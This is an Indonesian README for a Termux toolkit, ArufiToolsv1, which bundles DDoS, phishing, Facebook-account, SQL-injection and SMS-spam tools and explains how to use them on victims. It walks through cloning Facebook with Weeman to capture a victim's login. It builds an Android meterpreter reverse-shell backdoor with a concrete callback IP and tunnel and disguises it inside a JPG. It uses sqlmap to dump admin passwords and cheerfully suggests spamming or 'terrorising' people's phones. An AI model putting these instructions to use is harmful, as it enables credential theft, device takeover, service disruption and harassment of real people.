ArufiToolsv1

pkg update && pkg upgrade
pkg install git
pkg install curl
pkg install nano
pkg install bash
pkg install neofetch
pkg install python
pkg install python2
git hub https://github.com/MrAnonyWolf/ArufiToolsv1
cd ArufiToolsv1
chmod 755 ArufiToolsv1.sh
sh ArufiToolsv1.sh

Package/Paket artinya disediakan tools lain untuk menginstall secara bersamaan/Tools tambahan

Terdapat tools didalamnya diantaranya:
-DarkFB king
-DDos attack 1-Liteddos
             2-Hammer
             3-Goldeneye
-Wifi hacker
-Red Hawk
-Weeman
-Metasploit Framework
-Sqlmap
-Blackeye
-Spammer 1-SpamSms
         2-sdvspam
         3-Litespam
         4-Gcospam
         5-Prank

kemampuan script diantaranya:
-Deskripsi penggunaan
-Kalkulator
-Main tebakan
-Cuaca
-Musik
-Status

Cara menjalankannya setelah diinstall:

1- DarkFB
              cd DARK_KING
              nano login.txt untuk menyimpan token facebook cari aja digoogle cara dapat token fbnya
              setelah dicopy paste terus ctrl+s dan ctrl+x
              chmod 755 dog.py
              python2 dog.py
              Tanpa token kamu akan kena checkpoint
              cara lain agar tidak terkena checkpoint adalah login dibrowser opera atau dipc

2- DDOS ATTACK
              1- Liteddos
                         cd LITEDDOS
                         python2 LITEDDOS.py -nama ip -nama port(default 80) -banyak paket(default 135)

              2- Hammer
                       cd hammer
                       chmod 755 hammer.py
                       python hammer.py -nama ip -nama port(default 80) -banyak paket(default 135

              3- GoldenEye
                          cd GoldenEye
                          python2 goldeneye.py -nama url/alamat website
                          catatan: Yang ini hanya bekerja dengan website yang memakai http
  
   untuk mencari ip website tinggal ketik
   ping (alamat website/url website)
   ctrl+c(^C) untuk memberhentikan ping

3- Wifi Hacker(Untuk smartphone yang sudah diroot)
                                                  cd wifi-hacker
                                                  sh wifi-hacker.sh

4- Red Hawk
           cd RED_HAWK
           php rhawk.php
           ketik nama website www.(nama website).com jangan memakai http:// atau https://
           lalu pilih http atau https tergantung website yang memakainya
           
5- Weeman
         cd weeman
         chmod 755 weeman.py
         python2 weeman.py
         ketikkan nama website untuk diclone contoh set url  https://www.facebook.com
         ketik lagi nama website yang sama dengan set action_url
         show
         buka new session untuk lembar baru
         ketik ifconfig dilembar baru
         balik lagi ke lembar weeman terus run
         copy addressnya ke korban
         tunggu sampai korban login
         
6- Metasploit Framework
                       chmod +× metasploit.sh
                       ./metasploit.sh (jika mau menjalankan lagi setelah chmod)
                       
                       untuk membuat backdoor harus koneksi ke server dulu
                       >ssh -R <public-port>:localhost:<local-port> serveo.net
                       contoh
                       >ssh -R 3387:localhost:4444 serveo.net
                       @ sampai muncul tulisan hijau : Forwarding TCP connections from serveo.net:3387
                       
                       setelah itu ping serveo.net nya apakah merespon atau tidak. pencet new session
                       ping serveo.net

                       sekarang buat backdoornya. lanjut ke new session yang baru lagi
                       termux-setup-sdcard (untuk mengizinkan akses sdcard)
                       msfvenom -p android/meterpreter/reverse_tcp LHOST=159.89.214.31 LPORT=3387 -o $HOME/backdoor.apk
                       
                       jika telah diinstall, maka copy gambar file.jpg ke termux
                       contoh
                       cd /sdcard/DOWNLOAD
                       cp -R images.jpg $HOME
                       cd

                       sekarang tinggal satukan backdoor aplikasi dengan images.jpg
                       cat images.jpg backdoor.apk > namaimages.jpg
                       
                       setelah berhasil bikin payload images, sekarang tinggal lancarkan penyerangannya
                       msfconsole
                       msf5 > use exploit/multi/handler
                       msf5 > set payload android/meterpreter/reverse_tcp
                       msf5 > set LHOST 0.0.0.0
                       msf5 > set LPORT 4444
                       msf5 > run
                       > open payload imagesnya
                       meterpreter > ...

                       jika ssh tidak bisa tersambung ke meterpreter, gunakan ngrok

7- SQLmap
         cd sqlmap
         cari website yang menurut kalian rentan alias vulnerable
         python2 sqlmap.py -u -nama url/alamat website misal sqlmap.py -u http://www.contoh.com/index.php?id=6
         perintah -u untuk mengeksekusi/menjalankan perintah sqli
         setelah itu masukkan perintah python2 sqlmap.py -u http://www.contoh.com/index.php?id=6 --dbs
         maka akan menghasilkan GET parameter id is vulnerable berarti rentan
         pas gitu pencet Y/y dan enter
             untuk membongkar isinya masukkan perintah python2 sqlmap.py -u http://www.contoh.com/index.php?id=6 -D db_xxx --tables
             jika kalian beruntung akan muncul tabel. setelah itu anda harus memerintahkan ini
             sqlmap.py -u https://www.contoh.com/index.php?id=6 -D db_xxx -T users --columns
             setelah mendapatkan nama column dari tabel, ketikkan perintah ini
             sqlmap.py -u https://www.contoh.com/index.php?id=6 -D db_xxx -T users -C password,username --dump
         dan sentuhan akhirnya kalian bisa mendapatkan admin username sama password
         perlu kalian enkripsi passwordnya jika dihash tetapi banyak tipe hash diantaranya
1. DES(Unix)
[+] Digunakan di Linux dan sejenisnya.
[+] Panjang : 13 Karakter.
[+] Deskripsi : Dua karakter pertama adalah salt (Karakter acak, di contoh kita saltnya adalah string "Iv.") kemudian diikuti oleh Hashnya.
[+] Contoh : IvS7aeT4NzQPM

2. Domain Cached Credentials
[+] Digunakan untuk mencache password-password domain windows.
[+] Panjang : 16 bytes (32 Karakter)
[+] Algorithm : MD4(MD4(Unicode($pass)).Unicode(strtolower($username)))
[+] Contoh : Admin:b474d48cdfc4974d86ef4d24904cdd91

3. MD5(Unix)
[+] Digunakan di Linux dan sejenisnya.
[+] Panjang : 34 Karakter.
[+] Deskripsi : Hash dimulai dengan tanda $1$ kemudian dilanjutkan dengan salt (sampai dengan 8 karakter acak, di contoh kita saltnya adalah string "12345678") kemudian dilanjutkan dengan satu karakter lagi $ , kemudian diikuti oleh Hashnya.
[+] Algorithm : Sebenarnya ini adalah loop yang memanggil algoritma md5 sebanyak 2000 kali.
[+] Contoh : $1$12345678$XM4P3PrKBgKNnTaqG9P0T/

4. MD5(APR)
[+] Digunakan di Linux dan sejenisnya.
[+] Panjang : 37 Karakter.
[+] Deskripsi : Hash dimulai dengan tanda $apr1$ , kemudian dilanjutkan dengan salt (sampai dengan 8 karakter acak, di contoh kita saltnya adalah string "12345678"), kemudian dilanjutkan dengan satu karakter lagi $ , kemudian diikuti oleh Hashnya.
[+] Algorithm : Sebenarnya ini adalah loop yang memanggil algoritma md5 sebanyak 2000 kali.
[+] Contoh : $apr1$12345678$auQSX8Mvzt.tdBi4y6Xgj.

5. MD5(phpBB3)
[+] Digunakan di phpBB 3.x.x.
[+] Panjang : 37 Karakter.
[+] Dekripsi : Hash dimulai dengan tanda $H$ kemudian diikuti dengan satu karakter (paling sering angka "9") kemudian diikuti dengan salt (8 karakter acak, di contoh kita saltnya adalah string "12345678"), kemudian diikuti oleh Hashnya.
[+] Algorithm : Sebenarnya ini adalah loop yang memanggil algoritma md5 sebanyak 2048 kali.
[+] Contoh : $H$9123456785DAERgALpsri.D9z3ht120

6. MD5(Wordpress)
[+] Digunakan di Wordpress.
[+] Panjang : 34 Karakter.
[+] Deskripsi : Hash dimulai dengan tanda $P$ , kemudian diikuti dengan satu karakter (Paling sering huruf "B"), kemudian diikuti dengan salt (8 karakter acak, di contoh kita saltnya adalah string "12345678"), kemudian diikuti oleh Hashnya.
[+] Algorithm : Sebenarnya ini adalah loop yang memanggil algoritma md5 sebanyak 8192 kali.
[+] Contoh : $P$B123456780BhGFYSlUqGyE6ErKErL01

7. MySQL
[+] Digunakan di MySQL versi lama.
[+] Panjang : 8 bytes.
[+] Deskripsi : Hash yang terdiri dari dua DWORD, masing-masing tidak melebihi nilai 0x7fffffff.
[+] Contoh : 606717496665bcba

8. MySQL5
[+] Digunakan di MySQL Versi baru.
[+] Panjang : 20 bytes.
[+] Algorithm : SHA-1(SHA-1($pass))
[+] Contoh : *E6CC90B878B948C35E92B003C792C46C58C4AF40
[+] Catatan : Hash harus dimuat ke program tanpa tanda bintang (*) yang terdapat di awal setiap hash.

9. RAdmin v2.x
[+] Digunakan di Aplikasi Remote Administrator v2.x.
[+] Panjang : 16 bytes.
[+] Algorithm : Password diisi dengan nol dengan panjang 100 bytes, kemudian seluruh string dihash dengan algoritma MD5.
[+] Contoh : 5e32cceaafed5cc80866737dfb212d7f

10. MD5
[+] Digunakan di phpBB v2.x, Joomla versi di bawah 1.0.13 dan banyak forum dan CMS.
[+] Panjang : 16 bytes.
[+] Algorithm : sama seperti fungsi md5() di php.
[+] Contoh : c4ca4238a0b923820dcc509a6f75849b

11. md5($pass.$salt)
[+] Digunakan di WB News, Joomla Versi 1.0.13 keatas.
[+] Panjang : 16 bytes
[+] contoh : 6f04f0d75f6870858bae14ac0b6d9f73:1234

12. md5($salt.$pass)
[+] Digunakan di osCommerce, AEF, Gallery dan beberapa CMS.
[+] Panjang : 16 bytes.
[+] Contoh : f190ce9ac8445d249747cab7be43f7d5:12

13. md5(md5($pass))
[+] Digunakan di e107, DLE, AVE, Diferior, Koobi dan beberapa CMS.
[+] Panjang : 16 bytes.
[+] Contoh : 28c8edde3d61a0411511d3b1866f0636

14. md5(md5($pass).$salt)
[+] Digunakan di vBulletin, IceBB.
[+] Panjang ; 16 bytes.
[+] Contoh : 6011527690eddca23580955c216b1fd2:wQ6

15. md5(md5($salt).md5($pass))
[+] Digunakan di IPB.
[+] Panjang : 16 bytes.
[+] Contoh : 81f87275dd805aa018df8befe09fe9f8:wH6_S

16. md5(md5($salt).$pass)
[+] Digunakan di MyBB.
[+] Panjang : 16 bytes.
[+] Contoh : 816a14db44578f516cbaef25bd8d8296:1234

17. md5($salt.$pass.$salt)
[+] Digunakan di TBDev.
[+] Panjang : 16 bytes.
[+] Contoh : a3bc9e11fddf4fef4deea11e33668eab:1234

18. md5($salt.md5($salt.$pass))
[+] Digunakan di DLP.
[+] Panjang : 16 bytes.
[+] Contoh : 1d715e52285e5a6b546e442792652c8a:1234

20. SHA-1
[+] Digunakan dibanyak Forum dan CMS.
[+] Panjang : 20 bytes
[+] Algorithm: Sama dengan sha1() fungsi di PHP.
[+] Contoh : 356a192b7913b04c54574d18c28d46e6395428ab

21. sha1(strtolower($username).$pass)
[+] Digunakan di SMF
[+] Panjang : 20 bytes.
[+] Contoh : Admin:6c7ca345f63f835cb353ff15bd6c5e052ec08e7a

22. sha1($salt.sha1($salt.sha1($pass)))
[+] Digunakan di Woltlab BB
[+] Panjang : 20 bytes
[+] Contoh : cd37bfbf68d198d11d39a67158c0c9cddf34573b:1234

23. SHA-256(Unix)
[+] Digunakan di Linux dan sejenisnya.
[+] Panjang : 55 Karakter.
[+] Deskripsi : Hash dimulai dengan tanda $5$, kemudian diikuti salt (sampai dengan 8 karakter acak, di contoh kita saltnya adalah string "12345678"), kemudian dilanjutkan dengan satu karakter lagi $, kemudian diikuti hash sebenarnya.
[+] Algorithm : Sebenarnya ini adalah loop yang memanggil algoritma SHA-256 5000 kali.
[+] Contoh : $5$12345678$jBWLgeYZbSvREnuBr5s3gp13vqi...

24. SHA-512(Unix)
[+] Digunakan di Linux dan sejenisnya.
[+] Panjang : 98 Karakter.
[+] Deskripsi : Hash dimulai dengan tanda $6$, kemudian diikuti dengan salt (sampai dengan 8 karakter acak, dicontoh kita saltnya adalah string "12345678"), kemudian dilanjutkan dengan satu karakter lagi $, kemudian diikuti hash sebenarnya.
[+] Algorithm : Sebenarnya ini adalah loop yang memanggil algoritma SHA-512 5000 kali.
[+] contoh : $6$12345678$U6Yv5E1lWn6mEESzKen42o6rbEm...

ingat saya tidak bertanggung jawab atas kalian lakukan. ini hanya untuk materi pembelajaran


8- BlackEye
           cd blackeye
           bash blackeye.sh atau sh blackeye.sh

9- Spammer
          1-SpamSms
 
          2-sdvspam

          3-Litespam

          4-Gcospam

          5-Prank
      
    Spammer tidak rumit untuk dijalankan setidaknya kalian harus mengisi nomor korban 
    atau no hp kamu sendiri untuk menjalankannya. ingat ini hanya untuk jahil atau bercanda
    dan kalian bisa meneror atau melakukan prank tetapi jangan sampai adanya kecurigaan

Kemampuan Script:

[H]- Deskripsi penggunaan-> Untuk menampilkan instruksi/cara penggunaan

[K]- Kalkulator-> Untuk menampilkan script menjadi kalkulator buatan

[P]- Main tebakan-> Hanya permainan tetapi dapat berubah dengan acak sewaktu-waktu membuka

[C]- Cuaca-> Menampilkan informasi ramalan cuaca

[M]- Musik-> Mendownload MP3(kalau tidak bekerja harus mengupdate aplikasi termux terlebih dahulu)

[S]- Status-> Untuk mengecek informasi/spekifikasi ponselmu

Online required/tersedia online:

-Cuaca
-Musik

catatan: Salah satu dari kemampuan tools ini tidak akan berjalan terkecuali sipengguna 
         dalam keadaan online(memakai kuota)/membutuhkan koneksi terlebih dahulu
         jika tidak, akan muncul error pada script tersebut

Control(CTRL)+c untuk menghentikan script/animasi secara manual

*Coded by MrAnonyWolf
*Authorised by MrAnonyWolf and BuyutGans

Tidak boleh direcode hanya install saja script yang tersedia  
